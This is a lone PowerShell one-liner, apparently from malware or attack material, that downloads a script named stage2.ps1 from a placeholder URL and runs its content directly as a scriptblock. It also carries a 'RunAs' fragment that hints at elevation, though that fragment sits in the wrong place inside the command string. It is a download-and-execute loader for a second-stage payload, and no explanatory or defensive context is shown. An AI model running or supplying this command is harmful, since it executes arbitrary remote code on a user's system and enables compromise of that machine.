powershell.exe -Command "[scriptblock]::Create((Invoke-WebRequest '<url of stage2.ps1>').Content).Invoke(); -Verb RunAs"
